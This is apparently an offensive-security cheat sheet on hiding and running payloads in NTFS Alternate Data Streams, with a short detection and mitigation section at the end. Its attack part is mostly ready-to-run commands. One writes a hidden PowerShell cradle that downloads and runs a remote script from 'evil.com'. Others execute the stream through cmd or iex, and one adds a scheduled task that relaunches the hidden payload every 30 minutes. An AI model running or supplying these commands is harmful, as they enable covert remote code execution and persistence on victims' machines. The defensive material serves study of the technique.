# 🧱 NTFS Alternate Data Streams (ADS) - Living Off the Land

**NTFS ADS (Alternate Data Streams)** allow attackers to **hide payloads inside files** without changing their appearance. ADS are **invisible to Explorer**, often ignored by AV, and perfect for stealth staging or evasion.

> ⚠️ Used by malware to conceal scripts, backdoors, and droppers. File is untouched on the surface — payload lives in its shadow.

---

## 🛠️ What It Does
- NTFS allows each file to have multiple data streams
- The default stream is visible (`file.txt`), but alternate streams (`file.txt:hidden.bat`) are not
- Execution of hidden content is still possible via `more`, `cmd`, or `powershell`

---

## 💣 Hiding and Executing Payloads

### 1. Store Payload in Hidden Stream
```cmd
echo powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1') > legit.txt:hidden.bat
```
✅ `legit.txt` looks untouched — payload is stored in `:hidden.bat`

---

### 2. Execute Payload from ADS
```cmd
more < legit.txt:hidden.bat | cmd
```
✅ Reads and executes hidden payload — no file written to visible disk

---

### 3. Execute via PowerShell
```powershell
powershell -c "Get-Content .\legit.txt:hidden.bat | iex"
```
✅ Completely bypasses `.exe` detection with stream-based staging

---

### 4. Combine With Scheduled Tasks or WMI
```cmd
schtasks /create /tn "Update" /tr "cmd /c more < C:\Users\Public\note.txt:up.bat | cmd" /sc minute /mo 30 /f
```
✅ Hidden file persistence — looks like a normal file is scheduled

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| NTFS stream characters (:) in CLI | Alert on use of `:` in file paths, especially after file names |
| Script execution from `more`, `type`, `Get-Content` | Look for indirect loaders from common utilities |
| File tools showing mismatch | Use `streams.exe`, `dir /r`, or PowerShell to list ADS

---

## 🔐 Mitigation Strategies
- Use Sysinternals `streams.exe` or `dir /r` to audit alternate streams
- Block or monitor script execution from ADS locations
- Scan files for unexpected ADS content as part of forensic or incident response
- Educate blue teams — most endpoint AV doesn’t scan ADS by default

---

> 🧠 ADS is stealth at the filesystem level. It’s easy to miss, hard to detect, and often ignored by defenders. Red team gold — blue team nightmare.
